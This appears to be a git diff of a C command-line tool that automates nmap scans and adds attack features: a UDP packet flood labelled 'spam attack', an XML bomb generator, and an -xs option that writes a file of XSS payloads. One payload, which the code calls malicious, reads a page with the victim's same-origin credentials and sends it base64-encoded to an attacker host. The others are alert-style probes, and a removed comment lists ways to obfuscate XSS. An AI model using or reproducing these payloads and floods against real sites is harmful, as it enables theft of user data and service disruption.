@@ -1,15 +1,23 @@
+// main.c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include "os.h"
+#include "toolset.h"
+#include "toolset2.h"
 
+extern Tool2 tools2[];
+#define NMAP_INDEX 0    // Index in tools2[] for nmap
+
+//help menu
 void help()
 {
+    //nmap -sL 192.168.1.1/24
+    printf("  -Ci show ips connected to a host example 192.168.1.1/24\n");
     //ipconfig,ifconfig ip addr,
     printf("  -sI show ip the machine is connected to\n");
-    //with more details: arp, 
-    printf("  -sIm show ip with more details\n");
     //default scan:nmap -sC -sV -v <ip addr>
     printf("  -sO our typical scan\n");
     //default scan with given port:nmap -sC -sV -v <ip addr> -p <port number>
@@ -36,168 +44,132 @@ void help()
     printf("  -d6 default force ipv6\n");
     //default:mnap -sS -sV -O -T4 -v --traceroute 
     printf("  -d default scan\n");
-    // -Pn methon on nmap if it is needed
-    printf(" -Pn method if is needed,just type in the end -Pn, example ./networking_and_scans automation -i 192.168.1.1 -Pn\n");
-    //wireshark
-    printf("  -w watch live the traffic\n");
     //nc -lnvc
     printf("  -l listen to a port\n");
     //python3 -m <port number>
     printf("  -c create simple server with port\n");
     //
-    printf("  -xs xss code creation\n");
+    printf("  -xs xss code creation, a few example codes,eg type ./networking_and_scans_automation -xs flag.txt 192.168.1.10:80\n");
     //
     printf("  -xm create xml bomb size given by you\n");
     //
     printf("  -spA spam attack\n");
-    //
-    printf("  -sE see who is connected to a wifi, e.g 192.168.1.1/24\n");
 }
+//check tools
+// OS Codes: 0 = Linux/Unix, 1 = Windows, 2 = macOS
+void install_tool(int os_type, const Tool *tool) {
+    int result = 1;
 
-void check(int system_inf)
+    switch (os_type) {
+        case 0:
+            result = system(tool->install_cmd_unix);
+            break;
+        case 1:
+            result = system(tool->install_cmd_win);
+            break;
+        case 2:
+            result = system(tool->install_cmd_macos);
+            break;
+    }
+
+    if (result == 0)
+        printf("%s installed.\n", tool->name);
+    else
+        printf("Failed to install %s.\n", tool->name);
+}
+//check tools
+void check(int os_type)
 {
-    //check_nmap,check_wireshark,check_python,check_netcat
-    int check_all[3],i,install;
-    char a;
-    //freopen("NUL", "w", stdout); can be used too,it's the same thing
-    //nmap checking will execute but will not display any output or errors. > NUL 2>&1
-    check_all[0]=system("nmap --version > NUL 2>&1");
-    //wireshark checking will execute but will not display any output or errors. > NUL 2>&1
-    check_all[1]=system("wireshark --version > NUL 2>&1");
-    //python3 checking will execute but will not display any output or errors. > NUL 2>&1
-    check_all[2]=system("python3 --version > NUL 2>&1");
-    //netcat checking will execute but will not display any output or errors. > NUL 2>&1
-    check_all[3]=system("nc -h > NUL 2>&1");
-    int sum=0;
-    //for each check we add it if it succeed
-    for(i=0;i<=3;i++)
-    {
-        if(check_all[i]==0)
+    int status[NUM_TOOLS];
+    char choice;
+
+    // Check if tools are installed
+    int installed = 0;
+    for (int i = 0; i < NUM_TOOLS; i++) {
+        status[i] = system(tools[i].check_cmd);
+        if (status[i] == 0)
+            installed++;
+    }
+
+    if (installed == NUM_TOOLS) {
+        printf("All tools are already installed.\n");
+        return;
+    }
+
+    printf("Some tools are missing. Do you want to install them? [y/n]: ");
+    while (1) {
+        scanf(" %c", &choice);
+        if (choice == 'y' || choice == 'Y' || choice == 'n' || choice == 'N') break;
+        printf("Answer must be y/n: ");
+    }
+    if (choice == 'n' || choice == 'N') {
+        printf("Aborting installation.\n");
+        return;
+    }
+    // Install missing tools
+    for (int i = 0; i < NUM_TOOLS; i++) {
+        if (status[i] != 0) {
+            install_tool(os_type, &tools[i]);
+        }
+    } 
+}
+//nmap without a specific port
+void run_nmap(int os_type, const char *params,char *ip) {
+    const char *base_cmd = NULL;
+
+    switch (os_type) {
+        case 0: base_cmd = tools2[NMAP_INDEX].exec_cmd_unix; break;
+        case 1: base_cmd = tools2[NMAP_INDEX].exec_cmd_win; break;
+        case 2: base_cmd = tools2[NMAP_INDEX].exec_cmd_macos; break;
+    }
+
+    char full_command[512];
+    //preparing full command
+    snprintf(full_command, sizeof(full_command), "%s %s %s", base_cmd, params,ip);
+    //executing command
+    system(full_command);
+}
+//nmap with specific port
+void run_nmap_port(int os_type, const char *params,char *ip,char *port) {
+    const char *base_cmd = NULL;
+
+    switch (os_type) {
+        case 0: base_cmd = tools2[NMAP_INDEX].exec_cmd_unix; break;
+        case 1: base_cmd = tools2[NMAP_INDEX].exec_cmd_win; break;
+        case 2: base_cmd = tools2[NMAP_INDEX].exec_cmd_macos; break;
+    }
+
+    char full_command[512];
+    //preparing full command
+    snprintf(full_command, sizeof(full_command), "%s %s %s %s", base_cmd, params,port,ip);
+    //executing command
+    system(full_command);
+}
+//checking interfaces
+void check_interface(int system_type)
+{
+    int command;
+    if(system_type==0){
+        command=system("ip addr");
+        if(command !=0)
         {
-            sum++;
+            command=system("ifconfig");
         }
     }
-    //if all tools exist then  we give the user a message
-    if(sum==4)
+    else if (system_type==1)
     {
-        printf("all tools are checked\n");
+        command=system("ipconfig /all");
     }
     else
     {
-        printf("Do you want to install the requirments? [y/n]\n");
-        //loop that guarantes the a is y or Y or n or N as an asnwer
-        while(1)
-        {
-            scanf("%c",&a);
-            if(a=='y' || a=='Y' || a=='n' || a=='N')
-            {
-                //we stop the loop if the answer is what we wanted it to be
-                break;
-            }
-            else
-            {
-                //otherwise we help the user with a message
-                printf("answer must be y for yes or n for no\n");
-            }
-        }
-        int check_all_installed=0;
-        if(a=='y' || a=='Y')
-        {
-            //for each tool we install it with different way because of the os that is currently running
-            if(system_inf==0)
-            {
-                //installation on linux and unix
-                if(check_all[0]!=0)
-                {
-                    install=system("sudo apt install nmap");
-                    if(install==0)
-                    {
-                        check_all_installed++;
-                        printf("nmap installed\n");
-                    }
-                    else
-                    {
-                        printf("nmap couldn't get installed");
-                    }
-                }
-                else if(check_all[1]!=0)
-                {
-                    install=system("sudo install wireshark");
-                    if(install==0)
-                    {
-                        check_all_installed++;
-                        printf("wireshark installed\n");
-                    }
-                    else
-                    {
-                        printf("wireshark couldn't get installed");
-                    }
-                }
-                else if(check_all[2]!=0)
-                {
-                    install=system("sudo install python3");
-                    if(install==0)
-                    {
-                        check_all_installed++;
-                        printf("python3 installed\n");
-                    }
-                    else
-                    {
-                        printf("python3 couldn't get installed,try to install it from python.org or anywhere else\n");
-                    }
-                }
-                else if(check_all[3]!=0)
-                {
-                    install=system("sudo install netcat");
-                    if(install==0)
-                    {
-                        check_all_installed++;
-                        printf("netcat installed\n");
-                    }
-                    else
-                    {
-                        printf("netcat couldn't get installed\n");
-                    }
-                }
-            } 
-            if( check_all_installed==4)
-            {
-                printf("Now all tools are installed");
-            }
-            else
-            {
-                printf("Aborting\n");
-            }     
-        }
-        else
-        {
-            printf("exiting\n");
+        command=system("ifconfig");
+        //in case ifconfig fails or doesn't exist
+        if(command !=0){
+            command=system("networksetup -getinfo Wi-Fi");
         }
     }
-    system("rm NUL");
 }
-
-
-void nmap(char *ip,char command[])
-{
-    char full_command[200];
-    strcpy(full_command,command);
-    strcat (full_command, ip);
-    system(full_command);
-}
-
-void nmap_(char *ip,char *port,char command[])
-{
-    //char *full_command=command;
-    char full_command[200];
-    strcpy(full_command,command);
-    strcat (full_command, ip);
-    strcat(full_command," ");
-    strcat(full_command,"-p ");
-    strcat(full_command,port);
-    system(full_command);
-}
-
+//send udp packets,they don't need ack so it's fast
 void send_udp_packet(const char *target_ip, int target_port) {
     int sock;
     struct sockaddr_in dest;
@@ -224,39 +196,28 @@ void send_udp_packet(const char *target_ip, int target_port) {
     //close(sock);
 }
 
-int check_Pn(int argc,char *argv[])
-{
-    if(strcmp(argv[argc-1], "-Pn") == 0)
-    {
-        printf("Succes\n");
-        return 0;
-    }
-    else
-    {
-        return 1;
-    }
-}
-
-int main(int argc,char* argv[])
-{
-    int system_inf=0,n;
-    char y[0],c[0],*port,*ip,full_command[100];
-    #ifdef __linux__
-        //linux
-        system_inf=0;
-    #else
-        //not in list
-        system_inf=-1;
-        printf("system not in list\n");
+//main
+int main(int argc,char* argv[]) {
+    int os=0;
+    char y[0],c[0],full_command[100];
+    char *ip = NULL;
+    char *port = NULL;
+    char *params = NULL;
+    #if IS_LINUX
+        os=0;
+    #elif IS_WINDOWS
+        os=1;
+    #elif IS_MACOS
+        os=2;
+    #elif IS_UNIX
+        os=0;
     #endif
-    //checking requirments
-    check(system_inf);
-    //a help message to the user
     printf("For help type -h\n");
+    //checking all the tools
+    check(os);
     //if you want to print what argv[1] has:printf("%s\n",argv[1]);
     //compare what 2 pointers has (the content)
-    int check_pn=check_Pn(argc,argv);
-    int command;
+
     if(argc == 1)
     {
         printf("No arguments given\n");
@@ -268,27 +229,13 @@ int main(int argc,char* argv[])
         //calling help() function to print everything the user needs
             help();
         }
-        if(strcmp(argv[1], "-sI") == 0)
+        else if(strcmp(argv[1], "-Ci") == 0)
         {
-            if(system_inf==0)
-            {
-                command=system("ip addr");
-                if(command !=0)
-                {
-                    command=system("ifconfig");
-                }
-            }
+            printf("You must give a range of ips eg 192.168.1.1/24\n");
         }
-        else if(strcmp(argv[1], "-sIm") == 0)
+        else if(strcmp(argv[1], "-sI") == 0)
         {
-            if(system_inf==60)
-            {
-                command=system("arp");
-                if(command !=0)
-                {
-                    command=system("nmcli device show");
-                }
-            }
+            check_interface(os);
         }
         else if(strcmp(argv[1], "-sO") == 0)
         {
@@ -366,12 +313,26 @@ int main(int argc,char* argv[])
         {
             printf("You must give an ip address and port number,proccess aborts\n");
         }
+        else{
+            printf("Parametre not listed here\n");
+        }
     }
     else if (argc == 3)
     {
-        if(strcmp(argv[1], "-sO") == 0)
+        ip=argv[2];
+        if(strcmp(argv[1], "-sI") == 0)
         {
-            nmap(argv[2],"nmap -sC -sV -v ");
+            printf("Too many arguments\n");
+        }
+        else if(strcmp(argv[1], "-sO") == 0)
+        {
+            params="-sC -sV -v ";
+            run_nmap(os, params, ip);
+        }
+        else if(strcmp(argv[1], "-Ci") == 0)
+        {
+            params="-sL ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-sP") == 0)
         {
@@ -379,47 +340,58 @@ int main(int argc,char* argv[])
         }
         else if(strcmp(argv[1], "-iU") == 0)
         {
-            nmap(argv[2],"nmap -sS -sU -T4 -v --traceroute ");
+            params="-sS -sU -T4 -v --traceroute ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-scs") == 0)
         {
-            nmap(argv[2],"nmap -sS -sU -T4 -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --traceroute ");
+            params="-sS -sU -T4 -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --traceroute ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-sa") == 0)
         {
-            nmap(argv[2],"nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute ");
+            params="nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-iN") == 0)
         {
-            nmap(argv[2],"nmap -T4 -A -v -Pn --traceroute ");
+            params="-T4 -A -v -Pn --traceroute ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-i") == 0)
         {
-            nmap(argv[2],"nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute -sC -sV ");
+            params="-T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute -sC -sV ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-q") == 0)
         {
-            nmap(argv[2],"nmap -T4 --traceroute ");
+            params="-T4 --traceroute ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-sF") == 0)
         {
-            nmap(argv[2],"nmap --script=default,safe -sS -sV -O -T4 -v -6 --traceroute ");
+            params="--script=default,safe -sS -sV -O -T4 -v -6 --traceroute ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-sdb") == 0)
         {
-            nmap(argv[2],"nmap --script=default,safe -sS -sV -O -T4 -v --tracerout ");
+            params="--script=default,safe -sS -sV -O -T4 -v --tracerout ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-sA") == 0)
         {
-            nmap(argv[2],"nmap -A -sS -sV -O -T4 -v --traceroute ");
+            params="-A -sS -sV -O -T4 -v --traceroute ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-d6") == 0)
         {
-            nmap(argv[2],"nmap -sS -sV -O -T4 -v -6 --traceroute ");
+            params="-sS -sV -O -T4 -v -6 --traceroute ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-d") == 0)
         {
-            nmap(argv[2],"nmap -sS -sV -O -T4 -v --traceroute ");
+            params="-sS -sV -O -T4 -v --traceroute ";
+            run_nmap(os, params, ip);
         }
         else if(strcmp(argv[1], "-w") == 0)
         {
@@ -445,8 +417,7 @@ int main(int argc,char* argv[])
         }
         else if(strcmp(argv[1], "-xs") == 0)
         {
-            printf("give the ip address\n");
-
+            printf("give the ip address too, process aborts\n");
         }
         else if(strcmp(argv[1], "-xm") == 0)
         {
@@ -496,69 +467,23 @@ int main(int argc,char* argv[])
         }
         else if(strcmp(argv[1], "-sE") == 0)
         {
-            nmap(argv[2],"nmap -sn ");
+            params="-sn ";
+            run_nmap(os, params, ip);
+        }
+        else
+        {
+            printf("Parametre not listed here\n");
         }
     }
     else if (argc==4)
     {
-        if(check_pn==0)
-        {
-            if(strcmp(argv[1], "-sO") == 0)
-            {
-                nmap(argv[2],"nmap -sC -sV -v -Pn ");
-            }
-            else if(strcmp(argv[1], "-iU") == 0)
-            {
-                nmap(argv[2],"nmap -sS -sU -T4 -v --traceroute -Pn ");
-            }
-            else if(strcmp(argv[1], "-scs") == 0)
-            {
-                nmap(argv[2],"nmap -sS -sU -T4 -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --traceroute -Pn ");
-            }
-            else if(strcmp(argv[1], "-sa") == 0)
-            {
-                nmap(argv[2],"nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute -Pn ");
-            }
-            else if(strcmp(argv[1], "-iN") == 0)
-            {
-                nmap(argv[2],"nmap -T4 -A -v -Pn --traceroute -Pn ");
-            }
-            else if(strcmp(argv[1], "-i") == 0)
-            {
-                nmap(argv[2],"nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute -sC -sV -Pn ");
-            }
-            else if(strcmp(argv[1], "-q") == 0)
-            {
-                nmap(argv[2],"nmap -T4 --traceroute -Pn ");
-            }
-            else if(strcmp(argv[1], "-sF") == 0)
-            {
-                nmap(argv[2],"nmap --script=default,safe -sS -sV -O -T4 -v -6 --traceroute -Pn ");
-            }
-            else if(strcmp(argv[1], "-sdb") == 0)
-            {
-                nmap(argv[2],"nmap --script=default,safe -sS -sV -O -T4 -v --tracerout -Pn ");
-            }
-            else if(strcmp(argv[1], "-sA") == 0)
-            {
-                nmap(argv[2],"nmap -A -sS -sV -O -T4 -v --traceroute Pn ");
-            }
-            else if(strcmp(argv[1], "-d6") == 0)
-            {
-                nmap(argv[2],"nmap -sS -sV -O -T4 -v -6 --traceroute -Pn ");
-            }
-            else if(strcmp(argv[1], "-d") == 0)
-            {
-                nmap(argv[2],"nmap -sS -sV -O -T4 -v --traceroute -Pn ");
-            }
-            else if(strcmp(argv[1], "-sE") == 0)
-            {
-                nmap(argv[2],"nmap -sn -Pn ");
-            }
-        }
+
         if(strcmp(argv[1], "-sP") == 0)
         {
-            nmap_(argv[2],argv[3],"nmap -sC -sV -vv ");
+            port = argv[2];
+            ip = argv[3];
+            params = "-T4 -A -v -Pn --traceroute -p";
+            run_nmap_port(os, params, ip, port);
         }
         else if(strcmp(argv[1], "-xs") == 0)
         {
@@ -566,11 +491,27 @@ int main(int argc,char* argv[])
             //opening the xss.txt file in write mode
             fptr=fopen("xss.txt","w");
             //we put the data we need
+            fprintf(fptr,"Script 1, it's malicious and returnes encrypted data to the attaker\n");
+            fprintf(fptr,"It's for educational purposes only, or testing environment\n");
             fprintf(fptr,"<script>\nfetch(\"/");
             fprintf(fptr,argv[2]);
             fprintf(fptr,"\", {method:'GET',mode:'no-cors',credentials:'same-origin'})\n\t.then(response => response.text())\n\t.then(text => { \n\t\tfetch('http://");
             fprintf(fptr,argv[3]);
-            fprintf(fptr,"' + btoa(text), {mode:'no-cors'}); \n\t});\n</script>");
+            fprintf(fptr,"' + btoa(text), {mode:'no-cors'}); \n\t});\n</script>\n\n");
+            fprintf(fptr,"Script's to test if there is xss vulnerability\n\n");
+            fprintf(fptr,"Script-1 Alert script:\n");
+            fprintf(fptr,"<script>alert('XSS-Test-1');</script>\n\n");
+            fprintf(fptr,"Script-2 Image Tag XSS\n");
+            fprintf(fptr,"<img src=\"x\" onerror=\"alert('XSS-Test-2')\">\n\n");
+            fprintf(fptr,"Script-3 SVG XSS\n");
+            fprintf(fptr,"<svg onload=\"alert('XSS-Test-3')\"></svg>\n\n");
+            fprintf(fptr,"Script-4 JavaScript URI XSS\n");
+            fprintf(fptr,"<a href=\"javascript:alert('XSS-Test-4')\">Click Me (Safe Test)</a>\n\n");
+            fprintf(fptr,"Script-5 DOM-Based XSS\n");
+            fprintf(fptr,"<script>\n");
+            fprintf(fptr,"\tconst userInput = decodeURIComponent(window.location.hash.substring(1));\n");
+            fprintf(fptr,"\tdocument.write(userInput); // Vulnerable DOM manipulation\n");
+            fprintf(fptr,"</script>\n\n more on the next update");
             fclose(fptr);
         }
         else if(strcmp(argv[1], "-spA") == 0)
@@ -583,33 +524,15 @@ int main(int argc,char* argv[])
             printf("Starting attack on %s",target_ip);
             send_udp_packet(target_ip, target_port);
         }
-    }
-    else if(argc==5)
-    {
-        if(strcmp(argv[1], "-sP") == 0 && check_pn==0)
-        {
-            nmap_(argv[2],argv[3],"nmap -sC -sV -vv -Pn");
-        }
         else
         {
-            printf("Something is you can do the -Pn method only on nmap\n");
+            printf("Parametre not listed here\n");
         }
     }
     else
     {
         printf("Too many argumrnts\n");
     }
+    
     return 0;
 }
-
-/*
-Unicode obfuscation: Replace characters with visually identical Unicode ones (<script> → <scr\u0069pt>)
-
-String concatenation: Break payloads into parts and piece them together in JS ("a"+"l"+"e"+"r"+"t"(1))
-
-Base64 encoding + eval: Encode script and wrap it in eval(atob(...))
-
-Self-mutating scripts: Scripts that rewrite themselves using document.write() or setTimeout()
-
-Polyglot payloads: Ones that work across HTML, JS, and even JSON contexts
-*/
